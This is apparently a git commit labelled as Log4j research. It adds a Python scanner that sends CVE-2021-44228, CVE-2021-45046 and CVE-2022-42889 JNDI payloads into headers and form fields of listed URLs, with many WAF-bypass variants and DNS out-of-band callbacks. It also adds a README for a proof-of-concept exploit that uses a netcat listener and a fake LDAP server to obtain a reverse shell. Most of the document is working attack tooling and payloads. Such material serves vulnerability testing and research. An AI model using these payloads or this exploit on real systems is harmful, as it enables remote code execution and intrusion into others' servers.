5b308becd62efd72861a01606096875308b6f00d
husnain-ce <bitsol44@gmail.com>
2023-10-22 13:07:09 -0400

    research-log4j

---
+++ log4j-scan/log4j-scan.py
@@ -0,0 +1,322 @@
+#!/usr/bin/env python3
+
+import argparse
+import random
+import requests
+import time
+import sys
+from urllib import parse as urlparse
+import json
+from termcolor import cprint
+
+# Disable SSL warnings
+try:
+    import requests.packages.urllib3
+    requests.packages.urllib3.disable_warnings()
+except Exception:
+    pass
+
+
+cprint('[•] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")
+cprint('[•] The Next-Gen Attack Surface Management Platform.', "yellow")
+cprint('[•] Secure your External Attack Surface with Our Script', "yellow")
+
+if len(sys.argv) <= 1:
+    print('\n%s -h for help.' % (sys.argv[0]))
+    exit(0)
+
+default_headers = {
+    'User-Agent': 'log4j-scan',
+    'Accept': '*/*' 
+}
+
+post_data_parameters = ["username", "user", "uname", "name", "email", "email_address", "password"]
+timeout = 4
+
+waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
+                       "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
+                       "${jndi:rmi://{{callback_host}}/{{random}}}",
+                       "${jndi:rmi://{{callback_host}}}/",
+                       "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
+                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
+                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
+                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
+                       "${jndi:dns://{{callback_host}}/{{random}}}",
+                       "${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{callback_host}}/{{random}}}",
+                       "${jndi:dns://{{callback_host}}}",
+                       "${j${k8s:k5:-ND}i:ldap://{{callback_host}}/{{random}}}",
+                       "${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
+                       "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
+                       "${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
+                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
+                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//{{callback_host}}/{{random}}}",
+                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//{{callback_host}}/{{random}}}",
+                       "${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//{{callback_host}}/{{random}}",
+                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{callback_host}}/{{random}}}",
+                       "${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}}",
+                       "${jnd${upper:i}:ldap://{{callback_host}}/{{random}}}",
+                       "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}"
+                       ]
+
+cve_2021_45046 = [
+                  "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}",
+                  "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
+                  "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
+                 ]
+
+cve_2022_42889 =  [
+                  "${url:UTF-8::https://{{callback_host}}/}",
+                  "${url:UTF-8::https://{{callback_host}}/{{random}}}",
+                  "${url:UTF-8::http://{{callback_host}}/}",
+                  "${url:UTF-8::http://{{callback_host}}/{{random}}}",
+                  "${dns:address|{{callback_host}}}"
+                 ]
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-u", "--url",
+                    dest="url",
+                    help="Check a single URL.",
+                    action='store')
+parser.add_argument("-p", "--proxy",
+                    dest="proxy",
+                    help="send requests through proxy",
+                    action='store')
+parser.add_argument("-l", "--list",
+                    dest="usedlist",
+                    help="Check a list of URLs.",
+                    action='store')
+parser.add_argument("--request-type",
+                    dest="request_type",
+                    help="Request Type: (get, post) - [Default: get].",
+                    default="get",
+                    action='store')
+parser.add_argument("--headers-file",
+                    dest="headers_file",
+                    help="Headers fuzzing list - [default: headers.txt].",
+                    default="headers.txt",
+                    action='store')
+parser.add_argument("--run-all-tests",
+                    dest="run_all_tests",
+                    help="Run all available tests on each URL.",
+                    action='store_true')
+parser.add_argument("--exclude-user-agent-fuzzing",
+                    dest="exclude_user_agent_fuzzing",
+                    help="Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.",
+                    action='store_true')
+parser.add_argument("--wait-time",
+                    dest="wait_time",
+                    help="Wait time after all URLs are processed (in seconds) - [Default: 5].",
+                    default=5,
+                    type=int,
+                    action='store')
+parser.add_argument("--waf-bypass",
+                    dest="waf_bypass_payloads",
+                    help="Extend scans with WAF bypass payloads.",
+                    action='store_true')
+parser.add_argument("--custom-waf-bypass-payload",
+                    dest="custom_waf_bypass_payload",
+                    help="Test with custom WAF bypass payload.")
+parser.add_argument("--test-CVE-2021-45046",
+                    dest="cve_2021_45046",
+                    help="Test using payloads for CVE-2021-45046 (detection payloads).",
+                    action='store_true')
+parser.add_argument("--test-CVE-2022-42889",
+                    dest="cve_2022_42889",
+                    help="Test using payloads for Apache Commons Text RCE (CVE-2022-42889).",
+                    action='store_true')
+parser.add_argument("--custom-dns-callback-host",
+                    dest="custom_dns_callback_host",
+                    help="Custom DNS Callback Host.",
+                    action='store')
+parser.add_argument("--disable-http-redirects",
+                    dest="disable_redirects",
+                    help="Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have a higher chance of reaching vulnerable systems.",
+                    action='store_true')
+
+args = parser.parse_args()
+proxies = {}
+if args.proxy:
+    proxies = {"http": args.proxy, "https": args.proxy}
+
+if args.custom_waf_bypass_payload:
+    waf_bypass_payloads.append(args.custom_waf_bypass_payload)
+
+def get_fuzzing_headers(payload):
+    fuzzing_headers = {}
+    fuzzing_headers.update(default_headers)
+    with open(args.headers_file, "r") as f:
+        for i in f.readlines():
+            i = i.strip()
+            if i == "" or i.startswith("#"):
+                continue
+            fuzzing_headers.update({i: payload})
+    if args.exclude_user_agent_fuzzing:
+        fuzzing_headers["User-Agent"] = default_headers["User-Agent"]
+    if "Referer" in fuzzing_headers:
+        fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
+    return fuzzing_headers
+
+def get_fuzzing_post_data(payload):
+    fuzzing_post_data = {}
+    for i in post_data_parameters:
+        fuzzing_post_data.update({i: payload})
+    return fuzzing_post_data
+
+def generate_waf_bypass_payloads(callback_host, random_string):
+    payloads = []
+    for i in waf_bypass_payloads:
+        new_payload = i.replace("{{callback_host}}", callback_host)
+        new_payload = new_payload.replace("{{random}}", random_string)
+        payloads.append(new_payload)
+    return payloads
+
+def get_cve_2021_45046_payloads(callback_host, random_string):
+    payloads = []
+    for i in cve_2021_45046:
+        new_payload = i.replace("{{callback_host}}", callback_host)
+        new_payload = new_payload.replace("{{random}}", random_string)
+        payloads.append(new_payload)
+    return payloads
+
+def get_cve_2022_42889_payloads(callback_host, random_string):
+    payloads = []
+    for i in cve_2022_42889:
+        new_payload = i.replace("{{callback_host}}", callback_host)
+        new_payload = new_payload.replace("{{random}}", random_string)
+        payloads.append(new_payload)
+    return payloads
+
+class Dnslog(object):
+    def __init__(self):
+        self.s = requests.session()
+        req = self.s.get("http://www.dnslog.cn/getdomain.php",
+                         proxies=proxies,
+                         timeout=30)
+        self.domain = req.text
+    def pull_logs(self):
+        req = self.s.get("http://www.dnslog.cn/getrecords.php",
+                         proxies=proxies,
+                         timeout=30)
+        return req.json()
+
+
+def parse_url(url):
+    #Parses the URL
+    url = url.replace('#', '%23')
+    url = url.replace(' ', '%20')
+    if ('://' not in url):
+        url = str("http://") + str(url)
+    scheme = urlparse.urlparse(url).scheme
+    # FilePath: /login.jsp
+    file_path = urlparse.urlparse(url).path
+    if (file_path == ''):
+        file_path = '/'
+    return({"scheme": scheme,
+            "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
+            "host":  urlparse.urlparse(url).netloc.split(":")[0],
+            "file_path": file_path})
+
+
+def scan_url(url, callback_host):
+    parsed_url = parse_url(url)
+    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
+    payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
+    payloads = [payload]
+    if args.waf_bypass_payloads:
+        payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
+    if args.cve_2021_45046:
+        cprint(f"[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)", "yellow")
+        payloads.extend(get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
+    if args.cve_2022_42889:
+        cprint(f"[•] Scanning for CVE-2022-42889 (Apache Commons Text RCE)", "yellow")
+        payloads.extend(get_cve_2022_42889_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
+    for payload in payloads:
+        cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
+        if args.request_type.upper() == "GET" or args.run_all_tests:
+            try:
+                requests.request(url=url,
+                                 method="GET",
+                                 params={"v": payload},
+                                 headers=get_fuzzing_headers(payload),
+                                 verify=False,
+                                 timeout=timeout,
+                                 allow_redirects=(not args.disable_redirects),
+                                 proxies=proxies)
+            except Exception as e:
+                cprint(f"EXCEPTION: {e}")
+        if args.request_type.upper() == "POST" or args.run_all_tests:
+            try:
+                # Post body
+                requests.request(url=url,
+                                 method="POST",
+                                 params={"v": payload},
+                                 headers=get_fuzzing_headers(payload),
+                                 data=get_fuzzing_post_data(payload),
+                                 verify=False,
+                                 timeout=timeout,
+                                 allow_redirects=(not args.disable_redirects),
+                                 proxies=proxies)
+            except Exception as e:
+                cprint(f"EXCEPTION: {e}")
+            try:
+                # JSON body
+                requests.request(url=url,
+                                 method="POST",
+                                 params={"v": payload},
+                                 headers=get_fuzzing_headers(payload),
+                                 json=get_fuzzing_post_data(payload),
+                                 verify=False,
+                                 timeout=timeout,
+                                 allow_redirects=(not args.disable_redirects),
+                                 proxies=proxies)
+            except Exception as e:
+                cprint(f"EXCEPTION: {e}")
+
+
+def main():
+    urls = []
+    if args.url:
+        urls.append(args.url)
+    if args.usedlist:
+        with open(args.usedlist, "r") as f:
+            for i in f.readlines():
+                i = i.strip()
+                if i == "" or i.startswith("#"):
+                    continue
+                urls.append(i)
+    dns_callback_host = ""
+    if args.custom_dns_callback_host:
+        cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
+        dns_callback_host = args.custom_dns_callback_host
+    else:
+        cprint("[•] Initiating DNS callback server (Dnslog.cn).","green")
+        dns_callback = Dnslog()
+        dns_callback_host = dns_callback.domain
+
+    cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
+    for url in urls:
+        cprint(f"[•] URL: {url}", "magenta")
+        scan_url(url, dns_callback_host)
+
+    if args.custom_dns_callback_host:
+        cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
+        return
+
+    cprint("[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "cyan")
+    cprint("[•] Waiting...", "cyan")
+    time.sleep(int(args.wait_time))
+    records = dns_callback.pull_logs()
+    if len(records) == 0:
+        cprint("[•] Targets do not seem to be vulnerable.", "green")
+    else:
+        cprint("[!!!] Targets Affected", "red")
+        for i in records:
+            cprint(json.dumps(i), "yellow")
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\nKeyboard Interrupt Detected.")
+        print("Exiting...")
+        exit(0)
---
+++ log4j-shell-poc/README.md
@@ -0,0 +1,87 @@
+# __Log4j Shell POC__
+
+A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability.
+
+Recently there was a new vulnerability in log4j, a java logging library that is very widely used in the likes of elasticsearch, minecraft and numerous others.
+
+In this repository we have made and example vulnerable application and proof-of-concept (POC) exploit of it.
+
+
+__A video showing the exploitation process__
+
+# __Vulnerable Web App__
+
+<h3 align="center">
+<img align="center" src="https://user-images.githubusercontent.com/90478603/198688142-9dddb2ea-3763-48f6-a0bb-9045cc3bcd0a.gif">
+</h3>
+
+## __Proof-of-concept (POC)__
+
+As a PoC we have created a python file that automates the process. 
+
+__Requirements:__
+```bash
+pip install -r requirements.txt
+```
+__Usage:__
+
+
+* Start a netcat listener to accept reverse shell connection.<br>
+```py
+nc -lvnp 4545
+```
+* Launch the exploit.<br>
+**Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory.
+```py
+$ python3 poc.py --userip localhost --webport 9000 --lport 4545
+
+[!] CVE: CVE-2021-44228
+
+[+] Exploit java class created success
+[+] Setting up fake LDAP server
+
+[+] Send me: ${jndi:ldap://localhost:1389/a}
+
+Listening on 0.0.0.0:1389
+```
+
+This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.
+
+<br>
+
+
+Our vulnerable application
+
+We have added a Dockerfile with the vulnerable webapp. You can use this by following the steps below:
+```c
+1: docker build -t log4j-shell-poc .
+2: docker run --network host log4j-shell-poc
+```
+Once it is running, you can access it on localhost:8080
+
+If you would like to further develop the project you can use Intellij IDE which we used to develop the project. We have also included a `.idea` folder where we have configuration files which make the job a bit easier. You can probably also use other IDE's too.
+
+
+
+## __Getting the Java version.__
+
+At the time of creating the exploit we were unsure of exactly which versions of java work and which don't so chose to work with one of the earliest versions of java 8: `java-8u20`.
+
+Oracle thankfully provides an archive for all previous java versions:<br>
+[https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html).<br>
+Scroll down to `8u20` and download the appropriate files for your operating system and hardware.
+![Screenshot from 2021-12-11 00-09-25](https://user-images.githubusercontent.com/46561460/145655967-b5808b9f-d919-476f-9cbc-ed9eaff51585.png)
+
+**Note:** You do need to make an account to be able to download the package.
+
+Once you have downloaded and extracted the archive, you can find `java` and a few related binaries in `jdk1.8.0_20/bin`.<br>
+**Note:** Please make sure to extract the jdk folder into this repository with the same name in order for it to work.
+
+```
+❯ tar -xf jdk-8u20-linux-x64.tar.gz
+
+❯ ./jdk1.8.0_20/bin/java -version
+java version "1.8.0_20"
+Java(TM) SE Runtime Environment (build 1.8.0_20-b26)
+Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode)
+```
